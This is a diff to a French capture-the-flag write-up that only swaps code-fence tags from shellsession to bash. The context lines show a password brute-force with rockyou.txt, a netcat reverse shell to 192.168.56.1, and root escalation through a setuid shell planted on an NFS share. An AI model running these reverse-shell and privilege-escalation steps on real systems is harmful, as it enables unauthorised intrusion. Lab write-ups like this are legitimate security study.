@@ -83,7 +83,7 @@ Avec le nom d'utilisateur admin, on a un comportement différent. L'utilisateur 
 
 J'ai écrit un script Python pour bruteforcer le mot de passe (voir plus bas) qui était *booboo* mais une fois connecté il donne un nombre (sous la forme de lettres) puis ferme aussitôt la connexion.
 
-```shellsession
+```bash
 $ telnet 192.168.56.46 2323 
 Trying 192.168.56.46...
 Connected to 192.168.56.46.
@@ -150,7 +150,7 @@ with open(sys.argv[2], "rb") as fd:
 
 Exécution :
 
-```shellsession
+```bash
 $ python3 brute.py admin rockyou.txt
 line 0
 password booboo gave response 'ONE THOUSAND TWO HUNDRED NINETY'
@@ -201,7 +201,7 @@ Z:\home\fox>start /unix /bin/nc.traditional -e /bin/sh 192.168.56.1 9999
 
 Et sur le *ncat* que j'ai mis préalablement en écoute :
 
-```shellsession
+```bash
 $ ncat -l -p 9999 -v
 Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Listening on :::9999
@@ -221,7 +221,7 @@ Une fois connectée par ssh (enfin) je remarque dans les process le programme qu
 
 Il a été placé dans le system32 du Wine :
 
-```shellsession
+```bash
 $ find / -name recallserver.exe 2> /dev/null
 /home/fox/.wine/drive_c/windows/system32/recallserver.exe
 ```
@@ -261,7 +261,7 @@ La chaine `tutankamenFERILLI` est clairement quelque chose que je n'avais pas vu
 
 Il s'avère que c'est le mot de passe de l'utilisateur *fox* et qu'on peut s'en servir pour une commande sudo :
 
-```shellsession
+```bash
 $ sudo -l
 
 We trust you have received the usual lecture from the local System
@@ -287,7 +287,7 @@ Histoire de gagner du temps je me suis servit de [ehough/docker-nfs-server: A li
 
 Au début c'était mal parti :
 
-```shellsession
+```bash
 $ docker run                                            \
 >   -v /tmp/jail:/tmp/jail  \
 >   -e NFS_EXPORT_0='/tmp/jail                  *(ro,no_subtree_check)' \
@@ -308,7 +308,7 @@ $ docker run                                            \
 
 Il a fallut charger les modules kernel *nfs* et *nfsd* puis utiliser plutôt l'option *--privileged* pour que ça fonctionne :
 
-```shellsession
+```bash
 $ docker run -v /tmp/jail:/tmp/jail -e NFS_EXPORT_0='/tmp/jail   *(ro,no_subtree_check)' --privileged -p 2049:2049 erichough/nfs-server
 ==================================================================
       SETTING UP ...
@@ -346,7 +346,7 @@ $ docker run -v /tmp/jail:/tmp/jail -e NFS_EXPORT_0='/tmp/jail   *(ro,no_subtree
 
 Le partage est monté en lecture seule (je n'ai pas modifié la config par défaut qui est indiquée dans la ligne de commande) du coup j'ai recopié le */usr/bin/sh* de la VM dans le partage via SSH puis j'ai fait le `chown root:root` puis `chmod 4755` qu'il fallait.
 
-```shellsession
+```bash
 $ sudo /usr/sbin/mount.nfs 192.168.56.1:/tmp/jail /mnt
 $ cd /mnt
 $ ls -al
